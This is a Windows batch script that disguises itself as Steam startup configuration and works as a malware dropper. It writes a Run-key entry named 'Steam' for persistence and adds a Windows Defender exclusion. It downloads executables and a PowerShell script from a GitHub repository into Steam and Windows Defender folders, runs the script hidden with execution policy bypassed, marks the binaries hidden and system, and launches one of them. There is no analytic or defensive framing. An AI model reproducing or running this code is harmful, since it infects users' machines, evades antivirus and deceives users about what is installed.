@echo off
SET REG_KEY="HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
SET REG_VALUE="Steam"
SET REG_EXPECTED_VALUE="C:\Program Files (x86)\Steam\resource\steam.exe\" -silent"

:: Check if the registry value exists
REG QUERY %REG_KEY% /v %REG_VALUE% >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    :: Registry value exists, check if it matches the expected value
    FOR /F "tokens=3" %%A IN ('REG QUERY %REG_KEY% /v %REG_VALUE%') DO SET CURRENT_VALUE=%%A
    IF "%CURRENT_VALUE%" == "%REG_EXPECTED_VALUE%" (
        echo The value "%REG_VALUE%" is already set correctly: %REG_EXPECTED_VALUE%
    ) ELSE (
        echo The value "%REG_VALUE%" does not match. Current: "%CURRENT_VALUE%", Expected: "%REG_EXPECTED_VALUE%"
        echo Updating the value...
        REG ADD %REG_KEY% /v %REG_VALUE% /t REG_SZ /d %REG_EXPECTED_VALUE% /f
        echo The value has been updated to: %REG_EXPECTED_VALUE%
    )
) ELSE (
    :: Registry value does not exist, create it
    echo The value "%REG_VALUE%" does not exist. Creating it...
    REG ADD %REG_KEY% /v %REG_VALUE% /t REG_SZ /d %REG_EXPECTED_VALUE% /f
    echo The value "%REG_VALUE%" has been created with value: %REG_EXPECTED_VALUE%
)

pause

powershell Add-MpPreference -ExclusionPath %folderPath%
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/steam.exe -OutFile 'C:\Program Files (x86)\Steam\resource\steam.exe'"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/setup.ps1' -OutFile 'C:\ProgramData\Microsoft\Windows\setup.ps1'"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/X4M1967/hjgffhjg/refs/heads/main/NetWorkAppControl.exe' -OutFile 'C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe'"

powershell Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass', '-File "C:\ProgramData\Microsoft\Windows\setup.ps1"' -WindowStyle Hidden
attrib +h +s "C:\Program Files (x86)\Steam\resource\steam.exe"
attrib +h +s "C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe"
"C:\Program Files (x86)\Windows Defender\NetworkAppControl.exe"

